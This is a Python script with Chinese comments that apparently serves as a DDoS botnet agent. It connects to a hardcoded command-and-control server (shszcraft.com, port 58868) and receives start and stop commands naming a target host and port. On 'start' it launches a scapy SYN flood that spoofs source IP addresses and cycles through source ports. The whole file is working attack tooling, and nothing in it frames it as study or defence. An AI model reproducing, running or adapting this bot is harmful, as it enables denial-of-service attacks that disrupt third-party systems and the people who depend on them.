#!/usr/bin/python3
# -*- coding: utf-8 -*-
import sys
import socket
import random
import argparse
from multiprocessing import Process
from scapy.all import *
import os
isWorking = False
curProcess = None

# SYN泛洪攻击


def synFlood(tgt, dPort):
    print('=' * 100)
    print('The syn flood is running!')
    print('=' * 100)
    srcList = ['201.1.1.2', '10.1.1.102', '69.1.1.2', '125.130.5.199']
    for sPort in range(1024, 65535):
        index = random.randrange(4)
        ipLayer = IP(src=srcList[index], dst=tgt)
        tcpLayer = TCP(sport=sPort, dport=dPort, flags="S")
        packet = ipLayer / tcpLayer
        send(packet)

# 命令格式'#-H xxx.xxx.xxx.xxx -p xxxx -c <start>'
# 处理命令


def cmdHandle(sock, parser):
    global curProcess
    while True:
        # 接收命令
        data = sock.recv(1024).decode('utf-8')
        if len(data) == 0:
            print('The data is empty')
            return
        if data[0] == '#':
            try:
                # 解析命令
                options = parser.parse_args(data[1:].split())
                m_host = options.host
                m_port = options.port
                m_cmd = options.cmd
                # DDoS启动命令
                if m_cmd.lower() == 'start':
                    if curProcess != None and curProcess.is_alive():
                        curProcess.terminate()
                        curProcess = None
                        os.system('clear')
                    print('The synFlood is start')
                    p = Process(target=synFlood, args=(m_host, m_port))
                    p.start()
                    curProcess = p
                # DDoS停止命令
                elif m_cmd.lower() == 'stop':
                    if curProcess.is_alive():
                        curProcess.terminate()
                        os.system('clear')
            except:
                print('Failed to perform the command!')


def main():
    # 添加需要解析的命令
    p = argparse.ArgumentParser()
    p.add_argument('-H', dest='host', type=str)
    p.add_argument('-p', dest='port', type=int)
    p.add_argument('-c', dest='cmd', type=str)
    print("*" * 40)
    try:
        # 创建socket对象
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # 连接到服务器端
        s.connect(('shszcraft.com', 58868))
        print('To connected server was success!')
        print("=" * 40)
        # 处理命令
        cmdHandle(s, p)
    except:
        print('The network connected failed!')
        print('Please restart the script!')
        sys.exit(0)


if __name__ == '__main__':
    main()
